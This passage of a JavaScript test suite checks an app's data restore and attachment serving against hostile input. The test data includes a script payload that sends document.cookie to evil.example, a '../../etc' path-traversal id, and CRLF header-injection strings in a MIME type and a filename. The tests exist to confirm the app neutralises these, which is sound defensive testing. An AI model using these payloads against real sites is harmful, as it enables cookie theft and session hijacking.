        { id: theirs.id, title: "Planted", due_date: "2026-10-01", created_by_id: meVictim.id, created_by: meVictim.email },
        { id: "../../etc", title: "Odd id", due_date: "2026-10-01" },
        { id: "task_huge", title: "x".repeat(5000), due_date: "2026-10-01" },
        { id: "task_objects", title: { not: "text" }, due_date: "2026-10-01" },
        { id: "task_orphan", title: "Orphan", parent_id: "task_nowhere" },
        "not a record",
      ],
      notes: [{ id: "note_x", title: "Hi", created_by_id: meVictim.id, content_json: "{not json" }],
      priorities: [{ id: "p1", name: "" }],
      attachments: [{ id: "att_x", task_id: theirs.id, filename: "evil.html", mime_type: "text/html\r\nX-Evil: 1", file: "attachments/x/evil.html" }],
    };
    const result = await restore(attacker, Buffer.from(JSON.stringify(hostile)), "data.json");
    expect(result.statusCode).toBe(200);
    expect(result.body.added).toMatchObject({ tasks: 2, notes: 1 });
    expect(result.body.notes.join(" ")).toMatch(/3 records couldn't be read/);
    expect(result.body.notes.join(" ")).toMatch(/1 subtask skipped/);

    // The victim's task is untouched and the victim gained nothing.
    expect((await vs("GET", `/entities/Task/${theirs.id}`)).title).toBe("Victim's task");
    expect((await vs("GET", "/entities/Task")).map((t) => t.title)).toEqual(["Victim's task"]);
    expect(await vs("GET", "/entities/Note")).toEqual([]);

    // The attacker's copies are the attacker's, under fresh, safe ids.
    const planted = (await as("GET", "/entities/Task")).map((t) => ({ id: t.id, title: t.title }));
    expect(planted.map((t) => t.title).sort()).toEqual(["Odd id", "Planted"]);
    for (const t of planted) expect(t.id).toMatch(/^task_[0-9a-f-]{36}$/);
    // The planted file names a task that isn't the attacker's, so it's skipped.
    expect(db.prepare("SELECT COUNT(*) n FROM task_attachments WHERE filename = 'evil.html'").get().n).toBe(0);
  });

  it("explains what it can't use", async () => {
    const e = await login("restore-errors@example.com");
    const bad = async (bytes, filename = "export.zip") => (await restore(e, bytes, filename)).body;

    expect((await bad(Buffer.from("PK\u0003\u0004 definitely not a real zip"))).code).toBe("restore_bad_zip");
    expect((await bad(Buffer.from(JSON.stringify({ tasks: [] })), "data.json")).code).toBe("restore_not_export");
    expect((await bad(Buffer.from("hello"), "notes.txt")).code).toBe("restore_not_export");
    expect((await bad(Buffer.from(JSON.stringify({ format: "zephyrly-export", version: 2 })), "data.json")).code).toBe(
      "restore_newer_version"
    );
    const noData = await writeZip([{ name: "export/README.txt", data: "hi" }]);
    expect((await bad(noData)).code).toBe("restore_not_export");

    const unsigned = await invoke("/api/apps/test-app/restore", { method: "POST", headers: {}, body: "" });
    expect(unsigned.statusCode).toBe(401);
  });

  it("restores records from a bare data.json and says the files need the .zip", async () => {
    const { a } = await seedSource("restore-source-json@example.com");
    const data = dataJsonOf(await exportOf(a));
    const f = await login("restore-json-only@example.com");
    const result = await restore(f, Buffer.from(JSON.stringify(data)), "data.json");
    expect(result.body.added).toMatchObject({ tasks: 2, files: 0 });
    expect(result.body.notes.join(" ")).toContain("only data.json was uploaded");
  });

  it("takes an export made before names were read as UTF-8: real names, and no doubled files", async () => {
    const realName = "Résumé 日本.pdf";
    const oldName = Buffer.from(realName, "utf8").toString("latin1");
    const g = await login("restore-old-names@example.com");
    const task = await api(g)("POST", "/entities/Task", { title: "Job hunt", due_date: "2026-10-01" });
    const upload = await invoke(`/api/apps/test-app/tasks/${task.id}/attachments`, {
      method: "POST",
      headers: { Authorization: `Bearer ${g}`, "Content-Type": `multipart/form-data; boundary=${BOUNDARY}` },
      body: Buffer.concat([
        Buffer.from(`--${BOUNDARY}\r\nContent-Disposition: form-data; name="file"; filename="${realName}"\r\nContent-Type: application/pdf\r\n\r\n`),
        Buffer.from("%PDF-1.4 résumé"),
        Buffer.from(`\r\n--${BOUNDARY}--\r\n`),
      ]),
    });
    // Stored the way the old upload parser left it, and exported that way.
    db.prepare("UPDATE task_attachments SET filename = ? WHERE id = ?").run(oldName, upload.body.id);
    const zip = await exportOf(g);
    expect(dataJsonOf(zip).attachments.map((a) => a.filename)).toEqual([oldName]);

    // The boot repair fixes the stored name; the old export still matches it.
    createDatabase(config).close();
    expect((await restore(g, zip)).body.added.files).toBe(0);
    expect((await api(g)("GET", `/tasks/${task.id}/attachments`)).attachments.map((a) => a.filename)).toEqual([realName]);

    // Into another account, the file arrives under its real name.
    const h = await login("restore-old-names-target@example.com");
    expect((await restore(h, zip)).body.added).toMatchObject({ tasks: 1, files: 1 });
    const [copy] = await api(h)("GET", "/entities/Task");
    expect((await api(h)("GET", `/tasks/${copy.id}/attachments`)).attachments.map((a) => a.filename)).toEqual([realName]);
  });
});

describe("serving attachments", () => {
  const BOUNDARY = "----zephyrly-attachment-boundary";
  let token = "";
  let taskId = "";

  beforeAll(async () => {
    token = await login("attachment-serving@example.com");
    const task = await invoke("/api/apps/test-app/entities/Task", {
      method: "POST",
      headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      body: { title: "Has files", due_date: "2026-10-01" },
    });
    taskId = task.body.id;
  });

  /** Upload as a browser would, with the type the browser claims. */
  const upload = async (filename, mimeType, bytes, onTask = taskId) => {
    const result = await invoke(`/api/apps/test-app/tasks/${onTask}/attachments`, {
      method: "POST",
      headers: { Authorization: `Bearer ${token}`, "Content-Type": `multipart/form-data; boundary=${BOUNDARY}` },
      body: Buffer.concat([
        Buffer.from(
          `--${BOUNDARY}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\nContent-Type: ${mimeType}\r\n\r\n`
        ),
        Buffer.from(bytes),
        Buffer.from(`\r\n--${BOUNDARY}--\r\n`),
      ]),
    });
    expect(result.statusCode).toBe(201);
    return result.body;
  };
  const open = (id, query = "") =>
    invokeRaw(`/api/apps/test-app/attachments/${id}${query}`, { headers: { Authorization: `Bearer ${token}` } });
  const script = "<script>fetch('https://evil.example/?c=' + document.cookie)</script>";

  it("serves HTML as a download of opaque bytes, never as a page", async () => {
    for (const [filename, type] of [
      ["page.html", "text/html"],
      ["page.htm", "TEXT/HTML; charset=utf-8"],
      ["page.xhtml", "application/xhtml+xml"],
    ]) {
      const html = `<!doctype html><h1>Hi</h1>${script}`;
      const { id } = await upload(filename, type, html);
      const served = await open(id);
      expect(served.statusCode).toBe(200);
      expect(served.headers["Content-Type"]).toBe("application/octet-stream");
      expect(served.headers["Content-Disposition"]).toBe(`attachment; filename="${filename}"; filename*=UTF-8''${filename}`);
      expect(served.headers["X-Content-Type-Options"]).toBe("nosniff");
      expect(served.headers["Content-Security-Policy"]).toMatch(/^sandbox; default-src 'none'/);
      expect(served.body.toString()).toBe(html);
    }
  });

  it("doesn't serve an SVG inline as image/svg+xml, or count it as an image", async () => {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg">${script}</svg>`;
    const created = await upload("logo.svg", "image/svg+xml", svg);
    expect(created).toMatchObject({ is_image: false, has_thumb: false });

    for (const query of ["", "?thumb=1"]) {
      const served = await open(created.id, query);
      expect(served.headers["Content-Type"]).toBe("application/octet-stream");
      expect(served.headers["Content-Disposition"]).toMatch(/^attachment;/);
      expect(served.headers["X-Content-Type-Options"]).toBe("nosniff");
    }

    // One uploaded before SVGs stopped counting as images: stored as an
    // image, but the chip mustn't try to preview it.
    db.prepare("UPDATE task_attachments SET is_image = 1 WHERE id = ?").run(created.id);
    const listed = await invoke(`/api/apps/test-app/tasks/${taskId}/attachments`, {
      headers: { Authorization: `Bearer ${token}` },
    });
    expect(listed.body.attachments.find((a) => a.id === created.id).is_image).toBe(false);
  });

  it("still previews images and PDFs in place, locked down", async () => {
    const sharp = (await import("sharp")).default;
    const png = await sharp({ create: { width: 800, height: 600, channels: 3, background: "#3366ff" } }).png().toBuffer();
    const photo = await upload("photo.png", "image/png", png);
    expect(photo).toMatchObject({ is_image: true, has_thumb: true });
    const pdf = await upload("Boarding.pdf", "application/pdf", "%PDF-1.4 boarding pass");

    for (const [id, query, type] of [
      [photo.id, "", "image/png"],
      [photo.id, "?thumb=1", "image/webp"],
      [pdf.id, "", "application/pdf"],
    ]) {
      const served = await open(id, query);
      expect(served.statusCode).toBe(200);
      expect(served.headers["Content-Type"]).toBe(type);
      expect(served.headers["Content-Disposition"]).toMatch(/^inline;/);
      expect(served.headers["X-Content-Type-Options"]).toBe("nosniff");
      expect(served.headers["Content-Security-Policy"]).toBe(
        "sandbox; default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'"
      );
    }
    expect((await open(photo.id)).body.equals(png)).toBe(true);

    // The download button still asks for a download, and keeps the real type.
    const download = await open(pdf.id, "?download=1");
    expect(download.headers["Content-Type"]).toBe("application/pdf");
    expect(download.headers["Content-Disposition"]).toBe(`attachment; filename="Boarding.pdf"; filename*=UTF-8''Boarding.pdf`);
  });

  it("plays audio and video in place, without a sandbox their player can't sign in from", async () => {
    const memo = await upload("memo.m4a", "audio/x-m4a", "not really audio");
    const served = await open(memo.id);
    expect(served.headers["Content-Type"]).toBe("audio/x-m4a");
    expect(served.headers["Content-Disposition"]).toMatch(/^inline;/);
    expect(served.headers["X-Content-Type-Options"]).toBe("nosniff");
    const csp = served.headers["Content-Security-Policy"];
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("media-src 'self'");
    expect(csp).not.toContain("sandbox");
  });

  it("holds a file to the safe type it claimed, so a page can't pass as an image", async () => {
    const { id } = await upload("cat.png", "image/png", `<!doctype html>${script}`);
    const served = await open(id);
    expect(served.headers["Content-Type"]).toBe("image/png");
    expect(served.headers["X-Content-Type-Options"]).toBe("nosniff");
    expect(served.headers["Content-Security-Policy"]).toMatch(/^sandbox;/);
  });

  /**
   * The Content-Disposition a file is served with, checked the way Node's
   * real response checks it (this mock response doesn't): anything past
   * U+00FF, or a line break, throws ERR_INVALID_CHAR and fails the request.
   */
  const dispositionOf = async (id, query = "") => {
    const served = await open(id, query);
    expect(served.statusCode).toBe(200);
    const header = String(served.headers["Content-Disposition"]);
    expect(() => validateHeaderValue("Content-Disposition", header)).not.toThrow();
    expect(header).toMatch(/^[\x20-\x7e]+$/);
    const match = /^(inline|attachment); filename="([^"]*)"; filename\*=UTF-8''([A-Za-z0-9!#$&+.^_`|~%-]+)$/.exec(header);
    expect(match, header).not.toBeNull();
    return { type: match[1], fallback: match[2], name: decodeURIComponent(match[3]) };
  };
  // Each of these tests has its own task: one task holds at most 10 files.
  const newTask = async () =>
    (await invoke("/api/apps/test-app/entities/Task", {
      method: "POST",
      headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      body: { title: "Files with names", due_date: "2026-10-01" },
    })).body.id;
  const listedName = async (onTask, id) =>
    (await invoke(`/api/apps/test-app/tasks/${onTask}/attachments`, { headers: { Authorization: `Bearer ${token}` } })).body.attachments.find(
      (a) => a.id === id
    )?.filename;
  // What the upload parser used to store: the browser's UTF-8 bytes read as latin1.
  const asMojibake = (name) => Buffer.from(name, "utf8").toString("latin1");

  it("keeps a file's real name when it isn't plain ASCII, from upload to download", async () => {
    const task = await newTask();
    // A browser sends the name as raw UTF-8 bytes (the helper's Buffer.from).
    const resume = await upload("Résumé 日本.pdf", "application/pdf", "%PDF-1.4 résumé", task);
    expect(resume.filename).toBe("Résumé 日本.pdf");
    expect(await listedName(task, resume.id)).toBe("Résumé 日本.pdf");
    expect(await dispositionOf(resume.id)).toEqual({ type: "inline", fallback: "Resume __.pdf", name: "Résumé 日本.pdf" });
    expect(await dispositionOf(resume.id, "?download=1")).toMatchObject({ type: "attachment", name: "Résumé 日本.pdf" });

    // macOS screenshots have a narrow no-break space before AM/PM.
    const shotName = "Screenshot 2026-09-28 at 9.41.00\u202fAM.png";
    const shot = await upload(shotName, "image/png", "not really a png", task);
    expect(await listedName(task, shot.id)).toBe(shotName);
    expect(await dispositionOf(shot.id)).toEqual({
      type: "inline",
      fallback: "Screenshot 2026-09-28 at 9.41.00 AM.png",
      name: shotName,
    });

    // Types that only download keep their name too.
    const page = await upload("Café menu 🍝.html", "text/html", "<!doctype html>", task);
    expect(await dispositionOf(page.id)).toEqual({ type: "attachment", fallback: "Cafe menu _.html", name: "Café menu 🍝.html" });
  });

  it("serves a stored name that would break the header as a safe one", async () => {
    const { id } = await upload("placeholder.txt", "text/plain", "hello", await newTask());
    for (const [stored, expected] of [
      // Line breaks and quotes can't split the header or end the quoted name.
      ['Q3 "final"\r\nSet-Cookie: x=1.txt', "Q3 finalSet-Cookie: x=1.txt"],
      // Half of an emoji (a name cut short at 255 characters can end in one).
      ["notes \ud83d.txt", "notes \ufffd.txt"],
      ["", "file"],
    ]) {
      db.prepare("UPDATE task_attachments SET filename = ? WHERE id = ?").run(stored, id);
      expect((await dispositionOf(id)).name).toBe(expected);
    }
  });

  it("repairs names stored before uploads were read as UTF-8, once, at boot", async () => {
    const names = {
      resume: "Résumé 日本.pdf",
      shot: "Screenshot 2026-09-28 at 9.41.00\u202fAM.png",
      emoji: "Trip 🏔️ plan.txt",
      // Correct already, and must stay exactly as they are.
      german: "Größe.txt",
      japanese: "日本.txt",
      plain: "plain.txt",
      // Only latin1 characters, but not UTF-8 read as latin1 ("Ã" then "©" is).
      lookalike: "Ã tête.txt",
    };
    const task = await newTask();
    const ids = {};
    for (const [key, name] of Object.entries(names)) {
      ids[key] = (await upload(`${key}.txt`, "text/plain", key, task)).id;
      db.prepare("UPDATE task_attachments SET filename = ? WHERE id = ?").run(name, ids[key]);
    }
    // The broken state, as the old parser left it.
    for (const key of ["resume", "shot", "emoji"]) {
      db.prepare("UPDATE task_attachments SET filename = ? WHERE id = ?").run(asMojibake(names[key]), ids[key]);
    }
    expect(await listedName(task, ids.resume)).toBe("RÃ©sumÃ© æ\u0097¥æ\u009c¬.pdf");

    const boot = () => createDatabase(config).close();
    boot();
    for (const [key, name] of Object.entries(names)) expect(await listedName(task, ids[key])).toBe(name);
    expect(await dispositionOf(ids.resume)).toMatchObject({ name: names.resume });

    // A later boot changes nothing.
    boot();
    for (const [key, name] of Object.entries(names)) expect(await listedName(task, ids[key])).toBe(name);
  });
});

async function writeZip(entries) {
  const { planZip } = await import("./zip.js");
  const zip = planZip(entries);
  const chunks = [];
  await zip.write(async (chunk) => {
    chunks.push(chunk);
  });
  return Buffer.concat(chunks);
}
